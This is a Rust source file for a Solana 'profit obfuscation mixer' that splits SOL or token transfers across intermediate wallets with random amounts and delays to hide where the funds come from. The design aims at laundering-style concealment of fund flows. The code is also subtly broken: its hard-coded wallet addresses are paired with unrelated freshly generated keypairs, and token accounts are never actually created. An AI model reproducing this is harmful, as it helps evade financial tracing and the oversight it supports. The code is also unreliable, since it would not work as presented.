use anchor_client::solana_sdk::{
    commitment_config::CommitmentConfig,
    compute_budget::ComputeBudgetInstruction,
    instruction::Instruction,
    native_token::LAMPORTS_PER_SOL,
    pubkey::Pubkey,
    signature::{Keypair, Signature},
    signer::Signer,
    system_instruction,
    transaction::Transaction,
};
use anchor_lang::prelude::*;
use rand::{thread_rng, Rng, SeedableRng};
use rand_chacha::ChaCha20Rng;
use solana_client::{
    nonblocking::rpc_client::RpcClient,
    rpc_config::{RpcSendTransactionConfig, RpcSimulateTransactionConfig},
};
use solana_transaction_status::UiTransactionEncoding;
use spl_associated_token_account::get_associated_token_address;
use spl_token::instruction as token_instruction;
use std::{
    collections::{HashMap, VecDeque},
    str::FromStr,
    sync::Arc,
    time::{Duration, SystemTime, UNIX_EPOCH},
};
use tokio::{
    sync::{Mutex, RwLock},
    time::{interval, sleep},
};

const MIXER_WALLET_1: &str = "44Mdd71QKKKKPctzWL6BNByBmffXuLMAk7arwU59pfmP";
const MIXER_WALLET_2: &str = "uBqrrJ9QFyFSXRrHe9sNtju8hzBLsurttEDD5apw1S9";
const MIN_SPLIT_AMOUNT: u64 = 50_000_000;
const MAX_SPLIT_RATIO: f64 = 0.618;
const MIN_SPLIT_RATIO: f64 = 0.382;
const OBFUSCATION_DELAY_MS: u64 = 1500;
const MAX_MIXING_DEPTH: u8 = 4;
const DUST_THRESHOLD: u64 = 10_000;
const PRIORITY_FEE_LAMPORTS: u64 = 25_000;
const MAX_COMPUTE_UNITS: u32 = 400_000;
const RENT_EXEMPT_MINIMUM: u64 = 890_880;
const MAX_RETRIES: usize = 3;
const JITTER_RANGE_MS: u64 = 500;

#[derive(Clone, Debug)]
pub struct MixerWallet {
    pub pubkey: Pubkey,
    pub keypair: Arc<Keypair>,
    pub balance: u64,
    pub last_used: u64,
    pub transaction_count: u32,
    pub is_primary: bool,
    pub entropy_score: f64,
}

#[derive(Clone, Debug)]
pub struct ObfuscationTransaction {
    pub tx_hash: Signature,
    pub amount: u64,
    pub source: Pubkey,
    pub destination: Pubkey,
    pub timestamp: u64,
    pub depth: u8,
    pub token_mint: Option<Pubkey>,
    pub success: bool,
}

#[derive(Clone)]
pub struct MixingPath {
    pub hops: Vec<Pubkey>,
    pub amounts: Vec<u64>,
    pub delays: Vec<u64>,
    pub entropy: f64,
}

pub struct ProfitObfuscationMixer {
    rpc_client: Arc<RpcClient>,
    wallets: Arc<RwLock<HashMap<Pubkey, MixerWallet>>>,
    pending_transactions: Arc<Mutex<VecDeque<ObfuscationTransaction>>>,
    transaction_history: Arc<RwLock<Vec<ObfuscationTransaction>>>,
    mixing_paths: Arc<RwLock<HashMap<String, MixingPath>>>,
    token_accounts: Arc<RwLock<HashMap<Pubkey, HashMap<Pubkey, Pubkey>>>>,
    rng: Arc<Mutex<ChaCha20Rng>>,
}

impl ProfitObfuscationMixer {
    pub async fn new(rpc_url: &str) -> Result<Self, Box<dyn std::error::Error>> {
        let rpc_client = Arc::new(RpcClient::new_with_commitment(
            rpc_url.to_string(),
            CommitmentConfig::confirmed(),
        ));

        let mut wallets = HashMap::new();
        
        let wallet1_pubkey = Pubkey::from_str(MIXER_WALLET_1)?;
        let wallet2_pubkey = Pubkey::from_str(MIXER_WALLET_2)?;
        
        wallets.insert(
            wallet1_pubkey,
            MixerWallet {
                pubkey: wallet1_pubkey,
                keypair: Arc::new(Keypair::new()),
                balance: 0,
                last_used: 0,
                transaction_count: 0,
                is_primary: true,
                entropy_score: 1.0,
            },
        );
        
        wallets.insert(
            wallet2_pubkey,
            MixerWallet {
                pubkey: wallet2_pubkey,
                keypair: Arc::new(Keypair::new()),
                balance: 0,
                last_used: 0,
                transaction_count: 0,
                is_primary: true,
                entropy_score: 1.0,
            },
        );

        let seed = SystemTime::now().duration_since(UNIX_EPOCH)?.as_nanos() as u64;
        let rng = ChaCha20Rng::seed_from_u64(seed);

        Ok(Self {
            rpc_client,
            wallets: Arc::new(RwLock::new(wallets)),
            pending_transactions: Arc::new(Mutex::new(VecDeque::new())),
            transaction_history: Arc::new(RwLock::new(Vec::new())),
            mixing_paths: Arc::new(RwLock::new(HashMap::new())),
            token_accounts: Arc::new(RwLock::new(HashMap::new())),
            rng: Arc::new(Mutex::new(rng)),
        })
    }

    pub async fn add_mixer_keypair(&self, keypair: Keypair) -> Result<(), Box<dyn std::error::Error>> {
        let pubkey = keypair.pubkey();
        let mut wallets = self.wallets.write().await;
        
        wallets.insert(
            pubkey,
            MixerWallet {
                pubkey,
                keypair: Arc::new(keypair),
                balance: 0,
                last_used: 0,
                transaction_count: 0,
                is_primary: false,
                entropy_score: 0.5,
            },
        );
        
        Ok(())
    }

    pub async fn obfuscate_profits(
        &self,
        source_keypair: Arc<Keypair>,
        amount: u64,
        token_mint: Option<Pubkey>,
    ) -> Result<Vec<Signature>, Box<dyn std::error::Error>> {
        if amount < MIN_SPLIT_AMOUNT {
            return self.direct_transfer(source_keypair, amount, token_mint).await;
        }

        let mixing_path = self.generate_advanced_mixing_path(source_keypair.pubkey(), amount).await?;
        let mut signatures = Vec::new();
        let mut current_amount = amount;
        let mut current_keypair = source_keypair;

        for (i, hop) in mixing_path.hops.iter().enumerate() {
            if i >= MAX_MIXING_DEPTH as usize || current_amount < DUST_THRESHOLD {
                break;
            }

            let transfer_amount = mixing_path.amounts[i];
            let delay = mixing_path.delays[i];
            
            sleep(Duration::from_millis(delay)).await;

            let mut retries = 0;
            let signature = loop {
                match self.execute_transfer(&current_keypair, *hop, transfer_amount, token_mint).await {
                    Ok(sig) => break sig,
                    Err(e) if retries < MAX_RETRIES => {
                        retries += 1;
                        sleep(Duration::from_millis(100 * retries as u64)).await;
                    }
                    Err(e) => return Err(e),
                }
            };

            signatures.push(signature);

            self.record_transaction(
                signature,
                transfer_amount,
                current_keypair.pubkey(),
                *hop,
                i as u8,
                token_mint,
                true,
            ).await;

            current_amount = current_amount.saturating_sub(transfer_amount);
            
            if let Some(next_keypair) = self.get_wallet_keypair(hop).await {
                current_keypair = next_keypair;
            } else {
                break;
            }
        }

        if current_amount > DUST_THRESHOLD {
            let final_destination = self.select_final_destination().await?;
            let signature = self.execute_transfer(&current_keypair, final_destination, current_amount, token_mint).await?;
            signatures.push(signature);
        }

        Ok(signatures)
    }

    async fn generate_advanced_mixing_path(
        &self,
        source: Pubkey,
        amount: u64,
    ) -> Result<MixingPath, Box<dyn std::error::Error>> {
        let wallets = self.wallets.read().await;
        let mut available_wallets: Vec<_> = wallets
            .values()
            .filter(|w| w.pubkey != source && w.balance < amount * 2)
            .collect();

        available_wallets.sort_by(|a, b| {
            let a_score = a.entropy_score * (1.0 / (a.transaction_count as f64 + 1.0));
            let b_score = b.entropy_score * (1.0 / (b.transaction_count as f64 + 1.0));
            b_score.partial_cmp(&a_score).unwrap()
        });

        let mut rng = self.rng.lock().await;
        let path_length = std::cmp::min(
            ((amount as f64).log2() as usize).max(2),
            std::cmp::min(MAX_MIXING_DEPTH as usize, available_wallets.len()),
        );

        let mut hops = Vec::new();
        let mut amounts = Vec::new();
        let mut delays = Vec::new();
        let mut remaining = amount;

        for i in 0..path_length {
            let wallet_index = if i == 0 {
                0
            } else {
                rng.gen_range(0..std::cmp::min(3, available_wallets.len()))
            };

            if let Some(wallet) = available_wallets.get(wallet_index) {
                hops.push(wallet.pubkey);
                
                let ratio = self.calculate_dynamic_split_ratio(&mut *rng, remaining, i as u8);
                let transfer_amount = ((remaining as f64 * ratio) as u64).max(DUST_THRESHOLD);
                amounts.push(transfer_amount);
                
                let base_delay = OBFUSCATION_DELAY_MS;
                let jitter = rng.gen_range(0..JITTER_RANGE_MS);
                delays.push(base_delay + jitter);
                
                remaining = remaining.saturating_sub(transfer_amount);
            }
        }

        let entropy = self.calculate_path_entropy(&hops, &amounts);

        Ok(MixingPath {
            hops,
            amounts,
            delays,
            entropy,
        })
    }

    fn calculate_dynamic_split_ratio(&self, rng: &mut ChaCha20Rng, amount: u64, depth: u8) -> f64 {
        let base_ratio = rng.gen_range(MIN_SPLIT_RATIO..MAX_SPLIT_RATIO);
        let depth_decay = 0.95_f64.powi(depth as i32);
        let amount_factor = (1.0 + (amount as f64 / LAMPORTS_PER_SOL as f64).ln()).recip();
        
        (base_ratio * depth_decay * amount_factor).clamp(MIN_SPLIT_RATIO, MAX_SPLIT_RATIO)
    }

    fn calculate_path_entropy(&self, hops: &[Pubkey], amounts: &[u64]) -> f64 {
        if hops.is_empty() || amounts.is_empty() {
            return 0.0;
        }

        let total: u64 = amounts.iter().sum();
        let mut entropy = 0.0;

        for &amount in amounts {
            let p = amount as f64 / total as f64;
            if p > 0.0 {
                entropy -= p * p.log2();
            }
        }

        entropy * (hops.len() as f64).sqrt()
    }

    async fn execute_transfer(
        &self,
        from_keypair: &Arc<Keypair>,
        to_pubkey: Pubkey,
        amount: u64,
        token_mint: Option<Pubkey>,
    ) -> Result<Signature, Box<dyn std::error::Error>> {
        if let Some(mint) = token_mint {
            self.transfer_token(from_keypair, to_pubkey, mint, amount).await
        } else {
            self.transfer_sol(from_keypair, to_pubkey, amount).await
        }
    }

    async fn transfer_sol(
        &self,
        from_keypair: &Arc<Keypair>,
        to_pubkey: Pubkey,
        amount: u64,
    ) -> Result<Signature, Box<dyn std::error::Error>> {
        let balance = self.rpc_client.get_balance(&from_keypair.pubkey()).await?;
        if balance < amount + RENT_EXEMPT_MINIMUM {
            return Err("Insufficient balance for transfer".into());
        }

        let recent_blockhash = self.rpc_client.get_latest_blockhash().await?;
        
        let instructions = vec![
            ComputeBudgetInstruction::set_compute_unit_limit(MAX_COMPUTE_UNITS),
            ComputeBudgetInstruction::set_compute_unit_price(PRIORITY_FEE_LAMPORTS),
            system_instruction::transfer(&from_keypair.pubkey(), &to_pubkey, amount),
        ];

        let transaction = Transaction::new_signed_with_payer(
            &instructions,
            Some(&from_keypair.pubkey()),
            &[from_keypair.as_ref()],
            recent_blockhash,
        );

        let config = RpcSendTransactionConfig {
            skip_preflight: true,
            preflight_commitment: Some(CommitmentConfig::processed()),
            max_retries: Some(3),
            ..Default::default()
        };

                let signature = self.rpc_client.send_transaction_with_config(&transaction, config).await?;
        
        self.update_wallet_stats(&from_keypair.pubkey()).await;
        self.update_wallet_stats(&to_pubkey).await;

        Ok(signature)
    }

    async fn transfer_token(
        &self,
        from_keypair: &Arc<Keypair>,
        to_pubkey: Pubkey,
        mint: Pubkey,
        amount: u64,
    ) -> Result<Signature, Box<dyn std::error::Error>> {
        let from_token_account = self.get_or_create_token_account(&from_keypair.pubkey(), &mint).await?;
        let to_token_account = self.get_or_create_token_account(&to_pubkey, &mint).await?;

        let recent_blockhash = self.rpc_client.get_latest_blockhash().await?;
        
        let instructions = vec![
            ComputeBudgetInstruction::set_compute_unit_limit(MAX_COMPUTE_UNITS),
            ComputeBudgetInstruction::set_compute_unit_price(PRIORITY_FEE_LAMPORTS),
            token_instruction::transfer(
                &spl_token::id(),
                &from_token_account,
                &to_token_account,
                &from_keypair.pubkey(),
                &[],
                amount,
            )?,
        ];

        let transaction = Transaction::new_signed_with_payer(
            &instructions,
            Some(&from_keypair.pubkey()),
            &[from_keypair.as_ref()],
            recent_blockhash,
        );

        let config = RpcSendTransactionConfig {
            skip_preflight: true,
            preflight_commitment: Some(CommitmentConfig::processed()),
            max_retries: Some(3),
            ..Default::default()
        };

        let signature = self.rpc_client.send_transaction_with_config(&transaction, config).await?;
        
        Ok(signature)
    }

    async fn get_or_create_token_account(
        &self,
        owner: &Pubkey,
        mint: &Pubkey,
    ) -> Result<Pubkey, Box<dyn std::error::Error>> {
        let mut token_accounts = self.token_accounts.write().await;
        
        if let Some(owner_accounts) = token_accounts.get(owner) {
            if let Some(&account) = owner_accounts.get(mint) {
                return Ok(account);
            }
        }

        let associated_token_address = get_associated_token_address(owner, mint);
        
        let account_info = self.rpc_client.get_account(&associated_token_address).await;
        
        if account_info.is_err() {
            let rent = self.rpc_client.get_minimum_balance_for_rent_exemption(165).await?;
            
            if self.rpc_client.get_balance(owner).await? < rent + RENT_EXEMPT_MINIMUM {
                return Err("Insufficient balance to create token account".into());
            }
        }

        token_accounts
            .entry(*owner)
            .or_insert_with(HashMap::new)
            .insert(*mint, associated_token_address);
            
        Ok(associated_token_address)
    }

    async fn direct_transfer(
        &self,
        source_keypair: Arc<Keypair>,
        amount: u64,
        token_mint: Option<Pubkey>,
    ) -> Result<Vec<Signature>, Box<dyn std::error::Error>> {
        let destination = self.select_final_destination().await?;
        
        let signature = self.execute_transfer(&source_keypair, destination, amount, token_mint).await?;
        
        Ok(vec![signature])
    }

    async fn select_final_destination(&self) -> Result<Pubkey, Box<dyn std::error::Error>> {
        let wallets = self.wallets.read().await;
        let mut primary_wallets: Vec<_> = wallets
            .values()
            .filter(|w| w.is_primary)
            .collect();
        
        if primary_wallets.is_empty() {
            return Err("No primary wallets available".into());
        }
        
        primary_wallets.sort_by_key(|w| w.balance);
        
        let mut rng = self.rng.lock().await;
        let weighted_index = rng.gen_range(0..primary_wallets.len());
        
        Ok(primary_wallets[weighted_index].pubkey)
    }

    async fn get_wallet_keypair(&self, pubkey: &Pubkey) -> Option<Arc<Keypair>> {
        let wallets = self.wallets.read().await;
        wallets.get(pubkey).map(|w| Arc::clone(&w.keypair))
    }

    async fn update_wallet_stats(&self, pubkey: &Pubkey) {
        let mut wallets = self.wallets.write().await;
        if let Some(wallet) = wallets.get_mut(pubkey) {
            wallet.transaction_count += 1;
            wallet.last_used = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs();
            wallet.entropy_score = (wallet.entropy_score * 0.95 + 0.05).min(1.0);
        }
    }

    async fn record_transaction(
        &self,
        tx_hash: Signature,
        amount: u64,
        source: Pubkey,
        destination: Pubkey,
        depth: u8,
        token_mint: Option<Pubkey>,
        success: bool,
    ) {
        let tx = ObfuscationTransaction {
            tx_hash,
            amount,
            source,
            destination,
            timestamp: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            depth,
            token_mint,
            success,
        };

        self.pending_transactions.lock().await.push_back(tx.clone());
        self.transaction_history.write().await.push(tx);
    }

    pub async fn process_pending_transactions(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut pending = self.pending_transactions.lock().await;
        let current_time = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
        
        let mut confirmed_count = 0;
        while let Some(tx) = pending.front() {
            if current_time - tx.timestamp > 30 {
                match self.rpc_client.get_signature_status(&tx.tx_hash).await? {
                    Some(status) if status.is_ok() => {
                        pending.pop_front();
                        confirmed_count += 1;
                    }
                    Some(_) => {
                        pending.pop_front();
                    }
                    None if current_time - tx.timestamp > 60 => {
                        pending.pop_front();
                    }
                    _ => break,
                }
            } else {
                break;
            }
        }
        
        if confirmed_count > 0 {
            self.update_entropy_scores().await;
        }
        
        Ok(())
    }

    async fn update_entropy_scores(&self) {
        let mut wallets = self.wallets.write().await;
        let total_tx: u32 = wallets.values().map(|w| w.transaction_count).sum();
        
        if total_tx == 0 {
            return;
        }
        
        for wallet in wallets.values_mut() {
            let usage_ratio = wallet.transaction_count as f64 / total_tx as f64;
            wallet.entropy_score = (1.0 - usage_ratio).max(0.1);
        }
    }

    pub async fn rebalance_wallets(&self) -> Result<(), Box<dyn std::error::Error>> {
        self.update_balances().await?;
        
        let wallets = self.wallets.read().await;
        let total_balance: u64 = wallets.values().map(|w| w.balance).sum();
        
        if total_balance < MIN_SPLIT_AMOUNT * wallets.len() as u64 {
            return Ok(());
        }
        
        let target_balance = total_balance / wallets.len() as u64;
        let variance_threshold = target_balance / 3;
        
        let mut transfers = Vec::new();
        
        let mut high_balance_wallets: Vec<_> = wallets
            .values()
            .filter(|w| w.balance > target_balance + variance_threshold)
            .collect();
        
        let mut low_balance_wallets: Vec<_> = wallets
            .values()
            .filter(|w| w.balance < target_balance - variance_threshold && w.balance > RENT_EXEMPT_MINIMUM)
            .collect();
        
        high_balance_wallets.sort_by_key(|w| std::cmp::Reverse(w.balance));
        low_balance_wallets.sort_by_key(|w| w.balance);
        
        for high_wallet in high_balance_wallets.iter() {
            for low_wallet in low_balance_wallets.iter() {
                let excess = high_wallet.balance.saturating_sub(target_balance);
                let deficit = target_balance.saturating_sub(low_wallet.balance);
                let transfer_amount = excess.min(deficit).min(high_wallet.balance - RENT_EXEMPT_MINIMUM);
                
                if transfer_amount > MIN_SPLIT_AMOUNT {
                    transfers.push((high_wallet.pubkey, low_wallet.pubkey, transfer_amount));
                }
            }
        }
        
        drop(wallets);
        
        for (from, to, amount) in transfers.iter().take(3) {
            if let Some(keypair) = self.get_wallet_keypair(from).await {
                match self.transfer_sol(&keypair, *to, *amount).await {
                    Ok(_) => {
                        sleep(Duration::from_millis(500)).await;
                    }
                    Err(e) => eprintln!("Rebalance transfer failed: {}", e),
                }
            }
        }
        
        Ok(())
    }

    pub async fn update_balances(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut wallets = self.wallets.write().await;
        
        for wallet in wallets.values_mut() {
            match self.rpc_client.get_balance(&wallet.pubkey).await {
                Ok(balance) => wallet.balance = balance,
                Err(_) => continue,
            }
        }
        
        Ok(())
    }

    pub async fn create_intermediate_wallets(&self, count: usize) -> Result<(), Box<dyn std::error::Error>> {
        for _ in 0..count {
            let keypair = Keypair::new();
            self.add_mixer_keypair(keypair).await?;
        }
        Ok(())
    }

    pub async fn run_mixer_loop(&self) {
        let mut maintenance_interval = interval(Duration::from_secs(30));
        let mut rebalance_interval = interval(Duration::from_secs(300));
        
        loop {
            tokio::select! {
                _ = maintenance_interval.tick() => {
                    if let Err(e) = self.process_pending_transactions().await {
                        eprintln!("Error processing pending transactions: {}", e);
                    }
                    
                    if let Err(e) = self.update_balances().await {
                        eprintln!("Error updating balances: {}", e);
                    }
                }
                _ = rebalance_interval.tick() => {
                    if let Err(e) = self.rebalance_wallets().await {
                        eprintln!("Error rebalancing wallets: {}", e);
                    }
                }
            }
        }
    }

    pub async fn emergency_withdraw(
        &self,
        destination: Pubkey,
    ) -> Result<Vec<Signature>, Box<dyn std::error::Error>> {
        let mut signatures = Vec::new();
        let wallets = self.wallets.read().await;
        
        for wallet in wallets.values() {
            if wallet.balance > RENT_EXEMPT_MINIMUM + DUST_THRESHOLD {
                let withdraw_amount = wallet.balance.saturating_sub(RENT_EXEMPT_MINIMUM);
                match self.transfer_sol(&wallet.keypair, destination, withdraw_amount).await {
                    Ok(sig) => signatures.push(sig),
                    Err(e) => eprintln!("Failed to withdraw from {}: {}", wallet.pubkey, e),
                }
            }
        }
        
        Ok(signatures)
    }

    pub async fn get_mixing_statistics(&self) -> MixingStats {
        let history = self.transaction_history.read().await;
        let wallets = self.wallets.read().await;
        
        let total_mixed = history.iter().map(|tx| tx.amount).sum();
        let successful_transactions = history.iter().filter(|tx| tx.success).count() as u32;
        let total_transactions = history.len() as u32;
        let active_wallets = wallets.values().filter(|w| w.transaction_count > 0).count();
        let avg_depth = if total_transactions > 0 {
            history.iter().map(|tx| tx.depth as f64).sum::<f64>() / total_transactions as f64
        } else {
            0.0
        };
        
        let success_rate = if total_transactions > 0 {
            successful_transactions as f64 / total_transactions as f64
        } else {
            0.0
        };
        
        MixingStats {
            total_mixed,
            total_transactions,
            successful_transactions,
            active_wallets,
            average_mixing_depth: avg_depth,
            success_rate,
        }
    }
}

#[derive(Debug, Clone)]
pub struct MixingStats {
    pub total_mixed: u64,
    pub total_transactions: u32,
    pub successful_transactions: u32,
    pub active_wallets: usize,
    pub average_mixing_depth: f64,
    pub success_rate: f64,
}

impl ProfitObfuscationMixer {
    pub async fn optimize_mixing_strategy(&self) -> Result<(), Box<dyn std::error::Error>> {
        let stats = self.get_mixing_statistics().await;
        
        if stats.success_rate < 0.8 && stats.total_transactions > 10 {
            let mut paths = self.mixing_paths.write().await;
            paths.clear();
            
            let wallets = self.wallets.read().await;
            for wallet in wallets.values() {
                if wallet.transaction_count > 5 && wallet.entropy_score < 0.5 {
                    drop(wallets);
                    self.create_intermediate_wallets(2).await?;
                    break;
                }
            }
        }
        
        Ok(())
    }

    pub async fn get_optimal_mixer_wallet(&self) -> Result<Pubkey, Box<dyn std::error::Error>> {
        let wallets = self.wallets.read().await;
        
        let mut best_wallet = None;
        let mut best_score = 0.0;
        
        for wallet in wallets.values() {
            if wallet.balance > MIN_SPLIT_AMOUNT && wallet.keypair.pubkey() != Pubkey::default() {
                let score = wallet.entropy_score * (1.0 / (wallet.transaction_count as f64 + 1.0))
                    * (wallet.balance as f64 / LAMPORTS_PER_SOL as f64).min(1.0);
                
                if score > best_score {
                    best_score = score;
                    best_wallet = Some(wallet.pubkey);
                }
            }
        }
        
        best_wallet.ok_or_else(|| "No optimal mixer wallet available".into())
    }

    pub async fn cleanup_old_transactions(&self, max_age_hours: u64) -> Result<(), Box<dyn std::error::Error>> {
        let current_time = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
        let max_age_secs = max_age_hours * 3600;
        
        let mut history = self.transaction_history.write().await;
        history.retain(|tx| current_time - tx.timestamp < max_age_secs);
        
        let mut paths = self.mixing_paths.write().await;
        paths.clear();
        
        Ok(())
    }

    pub async fn validate_wallet_integrity(&self) -> Result<bool, Box<dyn std::error::Error>> {
        let wallets = self.wallets.read().await;
        
        for wallet in wallets.values() {
            if wallet.is_primary {
                let balance = self.rpc_client.get_balance(&wallet.pubkey).await?;
                if balance < RENT_EXEMPT_MINIMUM {
                    return Ok(false);
                }
            }
        }
        
        Ok(true)
    }

    pub async fn export_metrics(&self) -> HashMap<String, f64> {
        let stats = self.get_mixing_statistics().await;
        let mut metrics = HashMap::new();
        
        metrics.insert("total_mixed_sol".to_string(), stats.total_mixed as f64 / LAMPORTS_PER_SOL as f64);
        metrics.insert("total_transactions".to_string(), stats.total_transactions as f64);
        metrics.insert("success_rate".to_string(), stats.success_rate);
        metrics.insert("active_wallets".to_string(), stats.active_wallets as f64);
        metrics.insert("average_mixing_depth".to_string(), stats.average_mixing_depth);
        
        let wallets = self.wallets.read().await;
        let total_balance: u64 = wallets.values().map(|w| w.balance).sum();
        metrics.insert("total_balance_sol".to_string(), total_balance as f64 / LAMPORTS_PER_SOL as f64);
        
        metrics
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_mixer_initialization() {
        let mixer = ProfitObfuscationMixer::new("https://api.mainnet-beta.solana.com").await.unwrap();
        let wallets = mixer.wallets.read().await;
        assert_eq!(wallets.len(), 2);
    }

    #[tokio::test]
    async fn test_split_ratio_calculation() {
        let mixer = ProfitObfuscationMixer::new("https://api.mainnet-beta.solana.com").await.unwrap();
        let mut rng = mixer.rng.lock().await;
        let ratio = mixer.calculate_dynamic_split_ratio(&mut *rng, LAMPORTS_PER_SOL, 0);
        assert!(ratio >= MIN_SPLIT_RATIO && ratio <= MAX_SPLIT_RATIO);
    }

    #[tokio::test]
    async fn test_path_entropy_calculation() {
        let mixer = ProfitObfuscationMixer::new("https://api.mainnet-beta.solana.com").await.unwrap();
        let hops = vec![Pubkey::new_unique(), Pubkey::new_unique()];
        let amounts = vec![LAMPORTS_PER_SOL / 2, LAMPORTS_PER_SOL / 2];
        let entropy = mixer.calculate_path_entropy(&hops, &amounts);
        assert!(entropy > 0.0);
    }
}

